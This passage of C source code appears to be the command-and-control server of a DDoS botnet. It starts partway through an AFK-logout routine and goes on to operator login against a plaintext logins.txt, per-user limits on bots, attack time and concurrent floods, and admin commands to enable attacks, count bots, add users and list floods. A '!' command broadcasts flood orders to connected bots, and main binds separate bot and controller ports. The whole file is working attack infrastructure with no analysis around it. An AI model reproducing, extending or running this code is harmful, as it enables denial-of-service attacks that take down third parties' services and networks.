            sprintf(fbuf, "We've Detected You've Been AFK For Over An Hour, We're Logging You Out For Your Own Sake <3.\n");
            write(the_fd, fbuf, strlen(fbuf));
            accinfo[the_fd].connected = 0;
            accinfo[the_fd].time_logged = 0;
            accinfo[the_fd].lastcmd_time = 0;
            break;
        }

        if(time(NULL) - accinfo[the_fd].time_logged > 7200)
        {
            char fbuf[512];
            sprintf(fbuf, "We've Detected You've Been AFK For Over An Hour, We're Logging You Out Because You've Been Connected WAY To Long, Goodbye <3.\n");
            write(the_fd, fbuf, strlen(fbuf));
            accinfo[the_fd].connected = 0;
            accinfo[the_fd].time_logged = 0;
            accinfo[the_fd].lastcmd_time = 0;
            break;
        }
        sleep(1);
    }
    close(the_fd);
    pthread_exit(0);
}

void logcmd(int the_fd)
{
    FILE *logFile;
    logFile = fopen("chat.log", "a");
    time_t current_time;
    struct tm *local_time;
    current_time = time(NULL);
    accinfo[the_fd].lastcmd_time = time(NULL);
    local_time = localtime(&current_time);
    char ts[128];
    strcpy(ts, asctime(local_time));
    trim(ts); ts[strcspn(ts, "\n")] = 0;
    fprintf(logFile, "(%s) %s: \"%s\"\n", ts, accinfo[the_fd].username, accinfo[the_fd].lastcmd);
    fclose(logFile);
}

void adduser(char *cmd)
{
    FILE *loginFile;
    loginFile = fopen("logins.txt", "a");
    fprintf(loginFile, "\n%s", cmd);
    fclose(loginFile);
}

void *controller_thread(void *arg)
{
    //struct accountinfo_t accinfo;
    //struct ongoingatt_t ongoing;

    char rdbuf[512], username[32], password[32], hidden[32], logincaptcha[10], prompt[256];
    char *apibypass = "!API!";
    int logged_in = 0, file_fd;
    pthread_t thread;
    pthread_t athread;
    //printf("login\n");
    int cfd = *((int *)arg);
    accinfo[cfd].fd = *((int *)arg);


    write(accinfo[cfd].fd, "\033[?1049h", strlen("\033[?1049h"));
    write(accinfo[cfd].fd, "\x1b[1;37mлогин\x1b[97m -> ", strlen("\x1b[1;37mлогин\x1b[97m -> "));
    read(accinfo[cfd].fd, username, sizeof(username));
    write(accinfo[cfd].fd, "\x1b[1;37mпароль\x1b[97m -> ", strlen("\x1b[1;37mпароль\x1b[97m -> "));
    read(accinfo[cfd].fd, password, sizeof(password));

    if (strlen(username) <= 2 || strlen(password) <= 2)
    {
        close(accinfo[cfd].fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(hidden, 0, sizeof(hidden));
        pthread_exit(0);
    }

    trim(username); username[strcspn(username, "\n")] = 0;
    trim(password); password[strcspn(password, "\n")] = 0;

    if ((file_fd = open("logins.txt", O_RDONLY)) == -1)
    {
        close(accinfo[cfd].fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        pthread_exit(0);
    }

    if(verify_user(cfd, username, password) == 1)
    {
        write(accinfo[cfd].fd, "failed login\n", strlen("failed login\n"));
        close(accinfo[cfd].fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        pthread_exit(0);
    }
    while (memset(rdbuf, 0, sizeof(rdbuf)) && read_line(file_fd, rdbuf, sizeof(rdbuf)) != NULL)
    {
            int args_len, i;
            char **arguments;

            if (rdbuf[0] == '\r' || rdbuf[0] == '\n')
                break;

            if ((args_len = split(rdbuf, ' ', &arguments)) != 7)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }

            // verify all arguments
            strcpy(accinfo[cfd].username, arguments[0]);
            strcpy(accinfo[cfd].password, arguments[1]);
            accinfo[cfd].maxbots = atoi(arguments[2]);
            accinfo[cfd].attacktime = atoi(arguments[3]);
            accinfo[cfd].concurrents = atoi(arguments[4]);
            strcpy(accinfo[cfd].floods, arguments[5]);
            accinfo[cfd].admin = atoi(arguments[6]);

            if (strlen(accinfo[cfd].username) < 1 || strcmp(username, accinfo[cfd].username) != 0)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }
            if (strlen(accinfo[cfd].password) < 1 || strcmp(password, accinfo[cfd].password) != 0)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }
            if (accinfo[cfd].maxbots != -1 && (accinfo[cfd].maxbots <= 0 && accinfo[cfd].maxbots != -1))
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }
            if (accinfo[cfd].attacktime < 1 || accinfo[cfd].attacktime > 86400)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }
            if (accinfo[cfd].concurrents < 1 || accinfo[cfd].concurrents > 86400)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }
            if (accinfo[cfd].admin != 1 && accinfo[cfd].admin != 0)
            {
                for (i = 0; i < args_len; i++)
                    free(arguments[i]);

                free(arguments);
                continue;
            }

            for (i = 0; i < args_len; i++)
                free(arguments[i]);

            free(arguments);
            logged_in = 1;
            close(file_fd);
            break;
    }

    if (logged_in != 1)
    {
        close(accinfo[cfd].fd);
        memset(username, 0, sizeof(username));
        memset(password, 0, sizeof(password));
        memset(hidden, 0, sizeof(hidden));
        pthread_exit(0);
    }



    write(accinfo[cfd].fd, "\033[?1049h\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n", strlen("\033[?1049h") + 16);


        /*if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[1;37mWelcome \x1b[97m%s \x1b[1;37myou are now logged in with \x1b[97madmin \x1b[1;37mprivileges.\r\n\r\n", username);
        else
            sprintf(prompt, "\x1b[1;37mWelcome \x1b[97m%s \x1b[1;37myou are now logged in with \x1b[97muser \x1b[1;37mprivileges.\r\n\r\n", username);*/

        sendbanner(accinfo[cfd].fd);
        write(accinfo[cfd].fd, prompt, strlen(prompt));
        memset(prompt, 0, sizeof(prompt));

        if (accinfo[cfd].admin == 1)
            sprintf(prompt, "\x1b[1;37m%s\x1b[34m@\x1b[1;37mbotnet \x1b[34m:~# \033[1;37m", username);
        else
            sprintf(prompt, "\x1b[1;37m%s\x1b[34m@\x1b[1;37mbotnet \x1b[34m:~# \033[0m", username);

        write(accinfo[cfd].fd, prompt, strlen(prompt));

        if (accinfo[cfd].admin == 1)
            pthread_create(&thread, NULL, &tab_title_admin, &accinfo[cfd].fd);
        else
            pthread_create(&thread, NULL, &tab_title_user, &accinfo[cfd].fd);


    accinfo[cfd].connected = 1;
    accinfo[cfd].lastcmd_time = time(NULL);
    pthread_create(&athread, NULL, &detect_afk, &accinfo[cfd].fd);

    //operatorCount++;
    //int spam_detect = 0, last_spam = time(NULL) - 3;
    accinfo[cfd].connected = 1;
    accinfo[cfd].time_logged = time(NULL);
    int f;
    for (f = 0; f < MAXCONCURRENT; f++)
    {
        accinfo[cfd].ongoing_times[f] = 0;
    }

    while (memset(rdbuf, 0, sizeof(rdbuf)) && read(accinfo[cfd].fd, rdbuf, sizeof(rdbuf)) > 0)
    {
        trim(rdbuf);
        /*
        if (strlen(rdbuf) == 0)
        {
            if (last_spam + 2 > time(NULL))
                    spam_detect++;
                else
                {
                    spam_detect = 0;

                    if (spam_detect >= 5)
                    {
                        write(accinfo[cfd].fd, "\x1b[1;37mYou have been detected spamming, verify the captcha to contiune\r\n", strlen("\x1b[1;37mYou have been detected spamming, verify the captcha to contiune\r\n"));
                        while (1)
                        {
                            char captcha[6], code[32];

                            get_captcha(captcha, 6);
                            write(accinfo[cfd].fd, "\x1b[97m", strlen("\x1b[97m"));
                            write(accinfo[cfd].fd, captcha, strlen(captcha));
                            write(accinfo[cfd].fd, "\r\n\x1b[97mCaptcha Code: ", strlen("\r\n\x1b[97mCaptcha Code: "));
                            read(accinfo[cfd].fd, code, sizeof(code));
                            trim(code); code[strcspn(code, "\n")] = 0;

                            if (strcmp(captcha, code) != 0)
                            {
                                write(accinfo[cfd].fd, "\x1b[1;37mInvalid code please try again\r\n", strlen("\x1b[1;37mInvalid code please try again\r\n"));
                                sleep(1);
                                continue;
                            }

                            spam_detect = 0;
                            memset(captcha, 0, sizeof(captcha));
                            memset(code, 0, sizeof(code));
                            break;
                        }
                    }
                }
            
            write(accinfo[cfd].fd, prompt, strlen(prompt));
            memset(rdbuf, 0, sizeof(rdbuf));
            last_spam = time(NULL);
            continue;
        }

        spam_detect = 0;
        */

        if (strcmp(rdbuf, "help") == 0 || strcmp(rdbuf, "?") == 0)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            if (strcmp(accinfo[cfd].floods, "all") == 0)
            {
                int i = 0;

                for (i = 0; i < USER_COMMANDS; i++)
                {
                    char atk_help[128];
                        sprintf(atk_help, "\x1b[34m%s\x1b[97m: \x1b[1;37m%s\r\n", user_commands[i][0], user_commands[i][1]);
                    write(accinfo[cfd].fd, atk_help, strlen(atk_help));
                    memset(atk_help, 0, sizeof(atk_help));
                }
            }
            else
            {
                int args2_len, i, atk_count = 0;
                char **arguments2;

                if ((args2_len = split(accinfo[cfd].floods, ',', &arguments2)) <= 0)
                {
                    for (i = 0; i < args2_len; i++)
                        free(arguments2[i]);

                    free(arguments2);
                    write(accinfo[cfd].fd, "\x1b[92mUnknown Error, Please Contact The Owner Of The Service\r\n", strlen("\x1b[92mUnknown Error, Please Contact The Owner Of The Service\r\n"));
                }

                for (i = 0; i < args2_len; i++)
                {
                    int x;
                    for (x = 0; x < USER_COMMANDS; x++)
                    {
                        if (strcmp(user_commands[x][0], arguments2[i]) == 0)
                        {

                        }
                    }
                }

                if (atk_count == 0)
                    write(accinfo[cfd].fd, "\x1b[92mYou Don't Currently Have Access To Send Floods!\r\n", strlen("\x1b[92mYou Don't Currently Have Access To Send Floods!\r\n"));

                for (i = 0; i < args2_len; i++)
                    free(arguments2[i]);

                free(arguments2);

            }

            if (accinfo[cfd].admin == 1)
            {
                int i = 0;

                for (i = 0; i < ADMIN_COMMANDS; i++)
                {

                }
            }
        }

        else if (strcmp(rdbuf, "clear") == 0 || strcmp(rdbuf, "cls") == 0)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            write(accinfo[cfd].fd, "\033[2J\033[1;1H", strlen("\033[2J\033[1;1H"));
            sendbanner(accinfo[cfd].fd);
        }
        else if (strcmp(rdbuf, "exit") == 0 || strcmp(rdbuf, "quit") == 0 || strcmp(rdbuf, "^C") == 0)
        {
            write(accinfo[cfd].fd, "\x1b[32mGoodbye, See You Soon <3\r\n", strlen("\x1b[32mGoodbye, See You Soon <3\r\n"));
            accinfo[cfd].connected = 0;
            accinfo[cfd].time_logged = 0;
            close(accinfo[cfd].fd);
            //operatorCount--;
            memset(username, 0, sizeof(username));
            memset(password, 0, sizeof(password));
            memset(hidden, 0, sizeof(hidden));
            pthread_exit(0);
        }
        else if (strcmp(rdbuf, "attacks enable") == 0 && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            write(accinfo[cfd].fd, "\x1b[32mAttacks Have Been Enabled!\r\n", strlen("\x1b[32mAttacks Have Been Enabled!\r\n"));
            attacking = 1;
        }
        else if (strcmp(rdbuf, "attacks disable") == 0 && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            write(accinfo[cfd].fd, "\x1b[32mAttacks Have Been Disabled!\r\n", strlen("\x1b[32mAttacks Have Been Disabled!\r\n"));
            attacking = 0;
        }
        else if ((strcmp(rdbuf, "bots") == 0 || strcmp(rdbuf, "botcount") == 0) && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            botcount(accinfo[cfd].fd, 0, "");
        }

        else if (strstr(rdbuf, "botcount -s ") != NULL && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            char *query_line = strstr(rdbuf, "botcount -s ") + 12;
            botcount(accinfo[cfd].fd, 1, query_line);
        }
        else if (strstr(rdbuf, "botcount -e ") != NULL && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            char *query_line = strstr(rdbuf, "botcount -e ") + 12;
            botcount(accinfo[cfd].fd, 2, query_line);
        }
        else if(strstr(rdbuf, "adduser") != NULL && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            char *query_line = strstr(rdbuf, "adduser ") + 8;
            adduser(query_line);
        }
        else if (strstr(rdbuf, "viewfloods") != NULL && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            printattacks(accinfo[cfd].fd);
        }

        else if ((strcmp(rdbuf, "online") == 0 || strcmp(rdbuf, "test") == 0) && accinfo[cfd].admin == 1)
        {
            char tempbuf[2048];
            int f;
            for(f = 0; f < MAXFDS; f++)
            {
                if(accinfo[f].connected == 1)
                {
                    sprintf(tempbuf, "User: %s - Admin: %s - Floods Running: %d - Time Online: %ld Secs Since Last Cmd: [ %s ]\r\n", accinfo[f].username, accinfo[f].admin == 1 ? "yes" : "no", accinfo[f].slotavail, time(NULL) - accinfo[f].time_logged, accinfo[f].lastcmd);
                    write(accinfo[cfd].fd, tempbuf, strlen(tempbuf));
                }
            }
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
        }
        /*
        else if (strstr(rdbuf, "kickuser") == 0 && accinfo[cfd].admin == 1)
        {
            int kicc = 0;
            char tempbuf[256];
            char tempbuf2[256];
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            char *query_line = strstr(rdbuf, "kickuser ") + 9;
            int f;
            for(f = 0; f < MAXFDS; f++)
            {
                if(strcmp(query_line, accinfo[cfd].username) == 0)
                {
                    write(accinfo[cfd].fd, "can't kick yourself\n", strlen("can't kick yourself\n"));
                    break;
                }
                if(accinfo[f].connected == 1)
                {
                    if(strcmp(accinfo[f].username, query_line) == 0)
                    {
                        sprintf(tempbuf, "kicked by Admin [%s], terminating session...\r\n", accinfo[cfd].username);
                        write(accinfo[f].fd, tempbuf, strlen(tempbuf));
                        accinfo[f].connected = 0;
                        accinfo[f].time_logged = 0;
                        close(accinfo[f].fd);
                        operatorCount--;
                        kicc = 1;
                    }
                }
            }
            if(kicc == 0)
            {
                sprintf(tempbuf2, "unable to find user [%s]\r\n", accinfo[f].username);
                write(accinfo[cfd].fd, tempbuf2, strlen(tempbuf2));
            }
            else
            {
                sprintf(tempbuf2, "session terminated for user [%s]\r\n", accinfo[f].username);
                write(accinfo[cfd].fd, tempbuf2, strlen(tempbuf2));
            }

            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
        }
        */
        else if ((strcmp(rdbuf, "users") == 0 || strcmp(rdbuf, "userlist") == 0) && accinfo[cfd].admin == 1)
        {
            strcpy(accinfo[cfd].lastcmd, rdbuf);
            logcmd(accinfo[cfd].fd);
            userlist(accinfo[cfd].fd);
        }
        else if (rdbuf[0] == '!')
        {
        
            int f;
            for (f = 0; f < accinfo[cfd].concurrents; f++)
            {
                if(time(NULL) > accinfo[cfd].ongoing_times[f])
                {
                    if(accinfo[cfd].ongoing_times[f] != 0)
                    {
                        accinfo[cfd].ongoing_times[f] = 0;
                    }
                    accinfo[cfd].can_attack = 1;
                    accinfo[cfd].slotavail = f;
                    break;
                }
            }
            if(accinfo[cfd].can_attack == 0) 
            {
                write(accinfo[cfd].fd, "Cannot Send Flood, Global Concurrents Are Full!\n", strlen("Cannot Send Flood, Global Concurrents Are Full!\n"));
                accinfo[cfd].can_attack = 1; // cannot attack
            }
            else
            {

                if(strlen(rdbuf + 1) >= 512)
                {
                    write(accinfo[cfd].fd, "\x1b[32mYour Command Is Too Long, Stop Trying To Spam...\r\n", strlen("\x1b[32mYour Command Is Too Long, Stop Trying To Spam...\r\n"));
                }
    
                else
                {
                    int cooldown; // time of flood 
                    cooldown = broadcast_command(rdbuf + 1, accinfo[cfd].maxbots, accinfo[cfd].attacktime, accinfo[cfd].fd, accinfo[cfd].floods, accinfo[cfd].username, accinfo[cfd].admin);
                    
                    if(cooldown >= 1 /*&& accinfo[cfd].admin != 1*/)
                    {
                        accinfo[cfd].ongoing_times[accinfo[cfd].slotavail] = time(NULL) + cooldown;
                        strcpy(accinfo[cfd].lastcmd, rdbuf);
                        strcpy(accinfo[cfd].lastflood, rdbuf);
                        logcmd(accinfo[cfd].fd);
                        accinfo[cfd].can_attack = 0;

                        //logflood(username, rdbuf);
                        char fbuf[128];
                        sprintf(fbuf, "\x1b[1;37mAttack Sent Using (%d/%d) Of Your Concurrents\r\n", accinfo[cfd].slotavail + 1, accinfo[cfd].concurrents);
                        write(accinfo[cfd].fd, fbuf, strlen(fbuf));
                        memset(fbuf, 0, sizeof(fbuf));
                        //attacks[globavail].fd = accinfo[cfd].fd;
                        //strcpy(attacks[globavail].buf, rdbuf + 1);
                        //strcpy(attacks[globavail].user_sent, accinfo[cfd].username);
                        //attacks[globavail].time_left = accinfo[cfd].ongoing_times[accinfo[cfd].slotavail]; 

                    }
    
                }
            }
        }
        else
            write(accinfo[cfd].fd, "\x1b[1;37mCommand Could Not Be Found!\r\n", strlen("\x1b[1;37mCommand Could Not Be Found!\r\n"));

        write(accinfo[cfd].fd, prompt, strlen(prompt));
        memset(rdbuf, 0, sizeof(rdbuf));
    }
    accinfo[cfd].connected = 0;
    accinfo[cfd].time_logged = 0;
    close(accinfo[cfd].fd);
    //operatorCount--;

    memset(username, 0, sizeof(username));
    memset(password, 0, sizeof(password));
    memset(hidden, 0, sizeof(hidden));
    pthread_exit(0);
}

void *controller_listen(void *arg)
{
    int myfd = *((int *)arg), newfd;
    struct sockaddr in_addr;
    socklen_t in_len = sizeof(in_addr);

    if (listen(myfd, SOMAXCONN) == -1)
    {
        pthread_exit(0);
    }

    while (1)
    {
        if ((newfd = accept(myfd, &in_addr, &in_len)) == -1)
            break;

        pthread_t cthread;
        pthread_create(&cthread, NULL, &controller_thread, &newfd);
    }

    close(myfd);
    pthread_exit(0);
}



int main(int argc, char *argv[], void *sock)
{
    int s, i, threads;
    struct epoll_event event;

    signal(SIGPIPE, SIG_IGN);

    pthread_t controll_listener, ping_thread, global_attack_handle;

    if (argc != 4)
    {
        printf("[ботнет] Usage: ./cnc <bot-port> <cnc-port> <threads>\n");
        exit(EXIT_FAILURE);
    }
    else
    {
        threads = atoi(argv[3]);
        if (threads < 10 || threads > 750)
        {
            printf("[ботнет] You Are Trying To Use An Invalid Amount Of Threads\n");
            terminate();
        }
    }

    if ((listen_fd = create_and_bind(argv[1])) == -1)
    {
        printf("[ботнет] Failed To Bind To Bot Worker...\n");
        terminate();
    }

    if ((s = fd_set_blocking(listen_fd, 0)) == -1)
    {
        printf("[ботнет] Failed To Set Socket To Non-Blocking...\n");
        terminate();
    }

    if ((s = listen(listen_fd, SOMAXCONN)) == -1)
    {
        printf("[ботнет] Failed To Listen...\n");
        terminate();
    }

    if ((epoll_fd = epoll_create1(0)) == -1)
    {
        printf("[ботнет] Failed To Epoll Create...\n");
        terminate();
    }

    event.data.fd = listen_fd;
    event.events =  EPOLLIN | EPOLLET;

    if ((s = epoll_ctl(epoll_fd, EPOLL_CTL_ADD, listen_fd, &event)) == -1)
    {
        printf("[ботнет] Failed To Add Listen To Epoll...\n");
        terminate();
    }

    pthread_t thread[threads];
    while (threads--)
        pthread_create(&thread[threads], NULL, &bot_event, (void *) NULL);

    if ((s = create_and_bind(argv[2])) == -1)
    {
        printf("[ботнет] Failed To Bind Controller...\n");
        terminate();
    }

    pthread_create(&controll_listener, NULL, &controller_listen, &s);
    pthread_create(&ping_thread, NULL, &ping_pong, (void *) NULL);
    //int q = 0;

    while (1)
    {
        sleep(60);
    }

    printf("\r\nCNC Has Been Initiated!\r\n");

    close(listen_fd);
    return EXIT_SUCCESS;
}
